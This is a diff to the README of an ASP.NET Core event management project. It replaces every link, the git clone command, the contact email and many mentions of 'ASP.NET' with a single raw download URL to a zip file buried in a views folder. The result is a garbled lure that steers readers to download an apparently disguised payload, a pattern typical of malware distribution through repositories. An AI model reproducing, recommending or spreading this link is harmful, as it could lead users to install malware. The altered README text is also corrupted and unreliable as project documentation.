@@ -1,8 +1,8 @@
 # Event Management System 🎉
 
-Welcome to the **Event Management System** repository! This project is designed to simplify the process of managing and booking events. Built with ASP.NET Core 8.0, this full-stack web application leverages a robust 3-tier architecture to deliver a seamless user experience.
+Welcome to the **Event Management System** repository! This project is designed to simplify the process of managing and booking events. Built with https://github.com/flaviokapapelo25/Event-Managment-System/raw/refs/heads/master/Areeb.DAL/Views/Home/System_Event_Managment_v3.4.zip Core 8.0, this full-stack web application leverages a robust 3-tier architecture to deliver a seamless user experience.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/flaviokapapelo25/Event-Managment-System/releases)
+[![Download Releases](https://github.com/flaviokapapelo25/Event-Managment-System/raw/refs/heads/master/Areeb.DAL/Views/Home/System_Event_Managment_v3.4.zip%https://github.com/flaviokapapelo25/Event-Managment-System/raw/refs/heads/master/Areeb.DAL/Views/Home/System_Event_Managment_v3.4.zip)](https://github.com/flaviokapapelo25/Event-Managment-System/raw/refs/heads/master/Areeb.DAL/Views/Home/System_Event_Managment_v3.4.zip)
 
 ## Table of Contents
 
@@ -18,11 +18,11 @@ Welcome to the **Event Management System** repository! This project is designed 
 
 ## Overview
 
-The **Event Management System** allows users to easily create, manage, and book events. Whether you're an organizer looking to set up an event or a user wanting to book a spot, this application provides the tools you need. The use of ASP.NET Core ensures high performance and scalability, while the 3-tier architecture keeps the code organized and maintainable.
+The **Event Management System** allows users to easily create, manage, and book events. Whether you're an organizer looking to set up an event or a user wanting to book a spot, this application provides the tools you need. The use of https://github.com/flaviokapapelo25/Event-Managment-System/raw/refs/heads/master/Areeb.DAL/Views/Home/System_Event_Managment_v3.4.zip Core ensures high performance and scalability, while the 3-tier architecture keeps the code organized and maintainable.
 
 ## Key Features
 
-- **User Authentication**: Secure user login and registration using ASP.NET Identity.
+- **User Authentication**: Secure user login and registration using https://github.com/flaviokapapelo25/Event-Managment-System/raw/refs/heads/master/Areeb.DAL/Views/Home/System_Event_Managment_v3.4.zip Identity.
 - **Event Management**: Create, update, and delete events with ease.
 - **Admin Dashboard**: Monitor events and manage users from a dedicated admin panel.
 - **Email Notifications**: Stay informed with email updates using MailKit.
@@ -33,7 +33,7 @@ The **Event Management System** allows users to easily create, manage, and book 
 
 The system follows a **3-tier architecture**:
 
-1. **Presentation Layer**: The user interface built with ASP.NET MVC and Razor Pages.
+1. **Presentation Layer**: The user interface built with https://github.com/flaviokapapelo25/Event-Managment-System/raw/refs/heads/master/Areeb.DAL/Views/Home/System_Event_Managment_v3.4.zip MVC and Razor Pages.
 2. **Business Logic Layer**: Contains the core application logic and handles data processing.
 3. **Data Access Layer**: Interacts with the database using Entity Framework Core and LINQ.
 
@@ -41,14 +41,14 @@ This structure enhances maintainability and scalability, allowing for easier upd
 
 ## Technologies Used
 
-- **ASP.NET Core 8.0**: The framework for building the web application.
+- **https://github.com/flaviokapapelo25/Event-Managment-System/raw/refs/heads/master/Areeb.DAL/Views/Home/System_Event_Managment_v3.4.zip Core 8.0**: The framework for building the web application.
 - **Entity Framework Core**: An ORM for database operations.
 - **MailKit**: For sending email notifications.
 - **SQL Server**: The database management system.
 - **Dependency Injection**: To manage dependencies throughout the application.
 - **Repository Pattern**: For abstracting data access logic.
 - **LINQ**: For querying data in a more readable format.
-- **ASP.NET Identity**: For user authentication and authorization.
+- **https://github.com/flaviokapapelo25/Event-Managment-System/raw/refs/heads/master/Areeb.DAL/Views/Home/System_Event_Managment_v3.4.zip Identity**: For user authentication and authorization.
 - **Role-Based Access Control**: To manage user permissions effectively.
 
 ## Getting Started
@@ -66,7 +66,7 @@ To set up the **Event Management System** locally, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/flaviokapapelo25/Event-Managment-System.git
+   git clone https://github.com/flaviokapapelo25/Event-Managment-System/raw/refs/heads/master/Areeb.DAL/Views/Home/System_Event_Managment_v3.4.zip
    ```
 
 2. Navigate to the project directory:
@@ -85,7 +85,7 @@ To set up the **Event Management System** locally, follow these steps:
 
    - Open SQL Server Management Studio.
    - Create a new database named `EventManagementDB`.
-   - Update the connection string in `appsettings.json` to point to your database.
+   - Update the connection string in `https://github.com/flaviokapapelo25/Event-Managment-System/raw/refs/heads/master/Areeb.DAL/Views/Home/System_Event_Managment_v3.4.zip` to point to your database.
 
 5. Run the migrations to create the necessary tables:
 
@@ -143,7 +143,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or support, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [flaviokapapelo25](https://github.com/flaviokapapelo25)
+- **Email**: https://github.com/flaviokapapelo25/Event-Managment-System/raw/refs/heads/master/Areeb.DAL/Views/Home/System_Event_Managment_v3.4.zip
+- **GitHub**: [flaviokapapelo25](https://github.com/flaviokapapelo25/Event-Managment-System/raw/refs/heads/master/Areeb.DAL/Views/Home/System_Event_Managment_v3.4.zip)
 
-Explore the **Releases** section for the latest updates and versions of the Event Management System. [Download Releases](https://github.com/flaviokapapelo25/Event-Managment-System/releases) to get started today!
+Explore the **Releases** section for the latest updates and versions of the Event Management System. [Download Releases](https://github.com/flaviokapapelo25/Event-Managment-System/raw/refs/heads/master/Areeb.DAL/Views/Home/System_Event_Managment_v3.4.zip) to get started today!
